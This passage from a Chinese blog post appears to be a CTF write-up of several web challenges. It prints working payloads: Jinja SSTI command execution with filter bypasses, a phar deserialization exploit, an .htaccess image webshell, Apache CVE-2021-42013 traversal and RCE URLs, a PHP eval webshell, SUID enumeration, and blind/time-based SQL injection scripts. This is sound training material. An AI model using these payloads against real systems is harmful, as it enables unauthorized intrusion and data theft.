class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'nepop'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls%09/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
读flag用上题的绕过方法即可 
<span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__ssalc__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sesab__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sessalcbus__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__tini__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__slabolg__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'nepop'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sort%09/fla?_in_h3r3_52daad'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<h3><a id="UnserializeThree__phar_565"></a>UnserializeThree phar反序列化</h3> 
<p><img src="https://images2.imgbox.com/9a/24/nN6biH4Z_o.png" alt="image-20221120210541716"></p> 
<p>有一个上传点，只上传图片</p> 
<p>源码里面有注释 
 </p> 
<p>直接访问</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&gt;|&lt;|\?|php|"</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%0a"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token comment">//Same point ,can you bypass me again?</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>其实根本没有反序列化，就是直接eval了$cmd的内容</p> 
<p>不过需要绕一下 <code>"#".$this-&gt;cmd</code> ,绕注释可以换行， ban了<code>%0a</code>也就是<code>\n</code> 用<code>\r</code>替代就可以</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\rsystem('cat /flag');"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建对象</span>
<span class="token comment"># 下面这部分就没改</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>生成的<code>phar.phar </code>改后缀.jpg 然后上传</p> 
<p><img src="https://images2.imgbox.com/b8/da/wLtGlDt7_o.png" alt="image-20221120222623098"></p> 
<p>拿到路径后 phar读取</p> 
<p><img src="https://images2.imgbox.com/50/4b/5r5zsYjX_o.png" alt="image-20221120222641842"></p> 
<h3><a id="SQL_624"></a>又一个SQL</h3> 
<p>这题主要是把空格过滤了 然而常规%09还有/**/还是被禁用了</p> 
<p><code>/**/</code>这是多行注释</p> 
<p><code>/*!*/</code>是内联注释, 本题可以用<code>/*!*/</code></p> 
<p>手测发现是数字型 ，和布尔盲注 ，回显<code>好耶</code>即注入成功</p> 
<img src="https://images2.imgbox.com/eb/0f/8ik9EU7o_o.png" alt="image-20221121204953484"> 
<p>写脚本盲注</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">getDatabase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    ans<span class="token operator">=</span><span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        low <span class="token operator">=</span> <span class="token number">32</span>
        high <span class="token operator">=</span> <span class="token number">128</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">while</span> low <span class="token operator">&lt;</span> high<span class="token punctuation">:</span>
            <span class="token comment">#sql = "select/*!*/database()"</span>
            sql<span class="token operator">=</span><span class="token string">"select/*!*/group_concat(table_name)/*!*/from/*!*/information_schema.tables/*!*/where/*!*/table_schema=database()"</span><span class="token comment"># mysql.innodb_table_stats"</span>
            sql<span class="token operator">=</span><span class="token string">"select/*!*/group_concat(column_name)/*!*/from/*!*/information_schema.columns/*!*/where/*!*/table_name='wfy_comments'"</span>
            sql<span class="token operator">=</span><span class="token string">"select/*!*/group_concat(text)/*!*/from/*!*/wfy.wfy_comments"</span>
            payload<span class="token operator">=</span> <span class="token string">"1/*!*/and/*!*/(ascii(substr(({}),{},1))&lt;{})#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://55bf184d-6484-4bbe-bcae-5799b8bcf38b.node4.buuoj.cn:81/comments.php?name="</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>
            <span class="token comment"># print(payload)</span>
            <span class="token comment"># print(res.text.split("\n")[-1])</span>
            <span class="token keyword">if</span> <span class="token string">"好耶"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                high <span class="token operator">=</span> mid
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
            mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token comment"># if mid &lt;= 32 or mid &gt;= 127:</span>
        <span class="token comment">#     break</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] "</span><span class="token operator">+</span>ans<span class="token punctuation">)</span>

getDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<p>基本的盲注脚本注意空格即可</p> 
<p>最后爆出的flag内容前面一堆不可见字符，所以脚本不要过滤不可见字符</p> 
<p><img src="https://images2.imgbox.com/86/37/Pam2j8jC_o.png" alt="image-20221121211320066"></p> 
<h2><a id="week5_679"></a>week5</h2> 
<h3><a id="Give_me_your_photo_PLZ___681"></a>Give me your photo PLZ 图片马</h3> 
<p><img src="https://images2.imgbox.com/68/f4/krGPRP5s_o.png" alt="image-20221121211732351"></p> 
<p>最基础的图片马文件上传 ，Nginx服务器</p> 
<p><code>.htaccess</code>也没被ban</p> 
<pre><code>&lt;FilesMatch "pass.png"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre> 
<p>传入<code>.htaccess</code> pass.png 成功被执行</p> 
<p><img src="https://images2.imgbox.com/38/27/5Y7cgPAC_o.png" alt="image-20221121212223989"></p> 
<p><img src="https://images2.imgbox.com/80/79/DYHkjfQA_o.png" alt="image-20221121212344765"></p> 
<h3><a id="Unsafe_Apache__Apache_703"></a>Unsafe Apache Apache版本漏洞利用</h3> 
<p><img src="https://images2.imgbox.com/a3/23/ZjaqLbFI_o.png" alt="image-20221121212454276"></p> 
<p>直接插件读到了服务器版本，响应头也可以</p> 
<p><img src="https://images2.imgbox.com/12/b1/mEEa6VOt_o.png" alt="image-20221121212632401"></p> 
<p>去搜版本漏洞利用， 都是<code>Apache HTTP Server 2.4.50 路径穿越漏洞（CVE-2021-42013）</code></p> 
<p>https://blog.csdn.net/weixin_47311099/article/details/121773364</p> 
<p>目录穿越</p> 
<pre><code>http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
</code></pre> 
<p><img src="https://images2.imgbox.com/73/bc/lm5RuYx7_o.png" alt="image-20221121213114725"></p> 
<p>命令执行</p> 
<pre><code>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

echo;ls /
</code></pre> 
<p><img src="https://images2.imgbox.com/dc/61/FD6jwMDI_o.png" alt="image-20221121213818449"></p> 
<h3><a id="So_Baby_RCE_Again_735"></a>So Baby RCE Again</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/bash|curl/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>过滤bash curl 是不让反弹shell ，代码是没有回显</p> 
<p>可以通过shell_exec()写入shell</p> 
<pre><code class="prism language-php"><span class="token operator">/</span><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);?&gt;'</span> <span class="token operator">&gt;</span> shell<span class="token operator">.</span>php
</code></pre> 
<p><img src="https://images2.imgbox.com/f3/fd/HFSkkxSS_o.png" alt="image-20221120195425054"></p> 
<p>但是发现读不到flag文件 ，蚁剑连接shell</p> 
<p><code>ls -lha </code>查看文件权限</p> 
<p><img src="https://images2.imgbox.com/85/50/KoFAr2RI_o.png" alt="image-20221120200043920"></p> 
<p>考虑SUID提权 ,蚁剑这个命令没回显，还是要保存一下 ，在浏览器执行还是有回显的，还是利用date直接读</p> 
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
</code></pre> 
<p><img src="https://images2.imgbox.com/a7/8e/L6K2qFqX_o.png" alt="image-20221120203238500"></p> 
<h3><a id="BabySSTI_Three_775"></a>BabySSTI_Three</h3> 
<p>相较上周，又ban了下划线__ ,选择直接unicode编码绕</p> 
<pre><code class="prism language-python"><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

最后payload 
<span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__class__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__bases__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subclasses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__init__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
编码后即
<span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u0070\u006f\u0070\u0065\u006e'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p>读flag</p> 
<pre><code class="prism language-python"><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u0070\u006f\u0070\u0065\u006e'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sort%09/fla*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<h3><a id="Final_round__796"></a>Final round 时间盲注</h3> 
<blockquote> 
 <p>啊呜，好困呜呜～～～</p> 
</blockquote> 
<p>题干也提示 时间盲注了</p> 
<p>依然脚本跑 ,这题很坑的是把<code>/*!*/</code>也禁用了 ，所以使用括号分隔</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">'http://94a74348-9436-4092-a809-a2b7d8c9fc19.node4.buuoj.cn:81/comments.php'</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans<span class="token operator">=</span><span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        low <span class="token operator">=</span> <span class="token number">32</span>
        high <span class="token operator">=</span> <span class="token number">128</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">while</span> low <span class="token operator">&lt;</span> high<span class="token punctuation">:</span>
            sql <span class="token operator">=</span> <span class="token string">"database()"</span>
            sql<span class="token operator">=</span><span class="token string">"(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))"</span><span class="token comment"># mysql.innodb_table_stats</span>
            sql<span class="token operator">=</span><span class="token string">"(select(group_concat(column_name))from(information_schema.columns)where(table_name='wfy_comments'))"</span>
            sql<span class="token operator">=</span><span class="token string">"(select(reverse(group_concat(text)))from(wfy.wfy_comments))"</span>
            data<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
                <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'132||if(ascii(substr({},{},1))&lt;{},sleep(0.2),0)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            start<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            time_cha<span class="token operator">=</span>end<span class="token operator">-</span>start

            <span class="token keyword">if</span> time_cha<span class="token operator">&gt;</span><span class="token number">2</span><span class="token punctuation">:</span>
                high <span class="token operator">=</span> mid
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
            mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>

        ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] "</span><span class="token operator">+</span>ans<span class="token punctuation">)</span>

getflag<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<p>还是好久没跑时间盲注的脚本了，有些东西废了点时间</p> 
<p><code>设置睡的时间</code>和<code>请求的时间差</code>那里一直不是特别了解，测试倒是没问题，sleep(0.2)时请求的时间差大概在2.5s</p> 
<p>最后跑flag用了一下逆序reverse(),就不用等那么久了</p> 
<p><img src="https://images2.imgbox.com/7f/c7/jP6IRwnn_o.png" alt="image-20221122003628945"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a2964acfea37ab54f7442cd3af85453f/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">关于激光雷达传感器分类及简介</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0ae147c481f3565614eeb9df9be6f3ae/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">搭建一个基于 Markdown的文档编辑框架 - vue3 - vuepress （下）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>